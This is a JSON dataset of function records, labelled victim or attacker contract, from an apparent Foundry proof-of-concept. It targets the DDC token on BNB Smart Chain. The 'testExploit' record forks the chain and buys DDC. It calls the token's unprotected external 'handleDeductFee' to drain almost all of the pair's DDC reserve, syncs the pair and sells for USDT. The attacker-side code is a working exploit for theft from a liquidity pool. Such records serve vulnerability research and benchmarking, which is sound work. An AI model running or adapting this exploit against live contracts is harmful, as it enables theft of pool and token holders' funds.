[
  {
    "contract/interface": "IPair",
    "source_type": "victim_contract",
    "function_name": "sync",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "BuyDDC",
    "original_code": "    function BuyDDC() public {\n        WBNB.approve(address(TargetRouter), ~uint256(0));\n        address[] memory path = new address[](3);\n        path[0] = address(WBNB);\n        path[1] = address(USDT);\n        path[2] = address(DDC);\n        TargetRouter.swapExactTokensForTokens(WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp);\n        DDC.approve(address(TargetRouter), ~uint256(0));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "SellDDC",
    "original_code": "    function SellDDC() public {\n        address[] memory path = new address[](2);\n        path[0] = address(DDC);\n        path[1] = address(USDT);\n        TargetRouter.swapExactTokensForTokens(DDC.balanceOf(address(this)), 0, path, address(this), block.timestamp);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 20_840_079);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        emit log_named_decimal_uint(\"[Start] Attacker USDT balance before exploit\", USDT.balanceOf(address(this)), 18);\n\n        address(WBNB).call{value: 0.1 ether}(\"\");\n        BuyDDC();\n        uint256 pairReserve = DDC.balanceOf(address(TargetPair));\n        uint256 amount = pairReserve - 1;\n        DDC.handleDeductFee(0, amount, address(TargetPair), address(this));\n        TargetPair.sync();\n        SellDDC();\n\n        emit log_named_decimal_uint(\"[End] Attacker USDT balance after exploit\", USDT.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CheatCodes",
    "source_type": "victim_contract",
    "function_name": "createSelectFork",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IRouter",
    "source_type": "victim_contract",
    "function_name": "swapExactTokensForTokens",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IRouter",
    "source_type": "victim_contract",
    "function_name": "swapExactTokensForTokensSupportingFeeOnTransferTokens",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IERC20",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 value) public override returns (bool) {\n        require(spender != address(0));\n        _allowed[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IERC20",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address owner) public view override returns (uint256) {\n        return _balances[owner] + getReward(owner);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IERC20",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address to, uint256 value) public override returns (bool) {\n        _transferFrom(msg.sender, to, value);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ITokenAFeeHandler",
    "source_type": "victim_contract",
    "function_name": "handleDeductFee",
    "original_code": "    function handleDeductFee(ActionType actionType, uint256 feeAmount, address from,address user) external override {\n        distributeFee(actionType, feeAmount, from,user);\n    }\n\n    // Calculates the amount of reduced handling fee based on the amount entered and the total handling fee.\n",
    "description": ""
  }
]